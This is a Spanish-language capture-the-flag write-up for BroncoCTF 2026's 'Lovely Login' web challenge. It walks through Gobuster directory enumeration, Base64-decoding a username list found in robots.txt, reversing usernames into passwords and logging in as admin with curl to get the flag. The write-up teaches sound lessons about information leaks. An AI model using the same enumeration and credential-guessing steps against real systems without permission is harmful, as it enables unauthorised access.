WriteUp: Lovely Login (BroncoCTF 2026)
📋 Información General
Campo	Detalle
Nombre del Reto	Lovely Login
Categoría	Web / CTF
Dificultad	Fácil - Media
Plataforma	BroncoCTF 2026
URL	https://broncoctf-lovely-login.chals.io/
Técnicas usadas	Enumeración de directorios, decodificación Base64, ingeniería inversa de credenciales
📝 Descripción del Reto

    "Welcome to our lovely new login page 💕. The developers swear it’s secure… but they may have forgotten to clean up a few things before launch. Can you figure out how authentication works and log in as the right user?"

Se nos presenta una página de login simple con un formulario para usuario y contraseña. El reto sugiere que los desarrolladores dejaron información sensible expuesta.
🔍 Fase 1: Reconocimiento Inicial
Análisis del código fuente

Al inspeccionar el código fuente de la página, encontramos un formulario básico que envía peticiones POST en JSON al endpoint /login:
html

<input id="u" placeholder="Username">
<input id="p" placeholder="Password" type="password">
<button onclick="login()">Login</button>

javascript

async function login() {
  const u = document.getElementById("u").value;
  const p = document.getElementById("p").value;

  const res = await fetch("/login", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({username: u, password: p})
  });

  document.getElementById("out").innerHTML = await res.text();
}

Observaciones:

    El backend recibe JSON con {"username": "...", "password": "..."}

    Las respuestas son texto plano (no JSON)

    Si falla, devuelve "Wrong password"

🔎 Fase 2: Enumeración de Directorios

El reto menciona que "olvidaron limpiar algunas cosas". Esto sugiere que hay archivos o directorios expuestos.
Usando Gobuster
bash

gobuster dir -u https://broncoctf-lovely-login.chals.io/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x js,json,sql,bak,old,txt,env,git,log,config,ini,backup,swp

Resultado:
text

robots.txt           (Status: 200) [Size: 71]
security             (Status: 200) [Size: 387]
Security             (Status: 200) [Size: 387]

📄 Fase 3: Análisis de Archivos Encontrados
3.1 robots.txt
bash

curl -k https://broncoctf-lovely-login.chals.io/robots.txt

Contenido:
text

User-agent: *
Disallow: /security

# amVmZixzYXJhaCxhZG1pbixndWVzdA==

Análisis:

    El directorio /security/ está deshabilitado para crawlers... pero sigue accesible

    Hay un fragmento que parece Base64: amVmZixzYXJhaCxhZG1pbixndWVzdA==

3.2 Decodificación Base64
bash

echo "amVmZixzYXJhaCxhZG1pbixndWVzdA==" | base64 -d

Resultado:
text

jeff,sarah,admin,guest

Conclusión: Encontramos 4 usuarios válidos.
3.3 Directorio /security/
bash

curl -k https://broncoctf-lovely-login.chals.io/security/

Contenido:
html

<h1>Internal Security Notes</h1>

<p><b>Status:</b> Work in progress</p>

<ul>
  <li>Passwords are derived from usernames</li>
  <li>Current implementation stores them backwards for obfuscation</li>
  <li>Planned upgrade: hashing + salting</li>
</ul>

<p style="color:black;">
  <b>TODO:</b> remove this page before production deployment!
</p>

Pista clave:

    "Passwords are derived from usernames" → Las contraseñas se basan en los nombres de usuario

    "stores them backwards" → Las almacenan al revés

🔐 Fase 4: Obtención de Credenciales

Siguiendo la pista de la página /security/:
Usuario	Contraseña (invertida)
jeff	ffej
sarah	haras
admin	nimda
guest	tseug
🚀 Fase 5: Inicio de Sesión
Prueba con admin:nimda
bash

curl -X POST https://broncoctf-lovely-login.chals.io/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"nimda"}'

Respuesta:
html

<h2>Welcome, admin.</h2>
<img src="https://media.giphy.com/media/.../giphy.gif" style="max-width:300px;"><br>
<pre>bronco{R3v3rs1ng_1s_S3cure}</pre>

🏆 Flag
text

bronco{R3v3rs1ng_1s_S3cure}

📊 Resumen de la Metodología

    Enumeración con Gobuster para encontrar archivos sensibles

    Análisis de robots.txt y decodificación Base64 para obtener usuarios

    Inspección de /security/ para entender la política de contraseñas

    Ingeniería inversa de las contraseñas (invertir nombres de usuario)

    Autenticación con admin:nimda y extracción de la flag

🛠️ Herramientas Utilizadas
Herramienta	Versión	Uso
Gobuster	v3.8.2	Enumeración de directorios
cURL	7.81.0	Peticiones HTTP
Base64	-	Decodificación
Burp Suite / Repeater	-	Pruebas manuales (opcional)
ffuf	v2.1.0	Escaneo de directorios (opcional)
📚 Lecciones Aprendidas

    Nunca confíes en robots.txt para ocultar información sensible

    Los comentarios en código y archivos expuestos son una fuente común de fugas de información

    El Base64 no es cifrado, es solo codificación

    Siempre revisa los directorios descubiertos en enumeraciones

    Las pistas en el servidor son intencionales y guían hacia la solución

🔗 Referencias

    SecLists - Colección de Wordlists

    Gobuster - Herramienta de enumeración

    ffuf - Fuzzing rápido

    Base64 - Codificación estándar
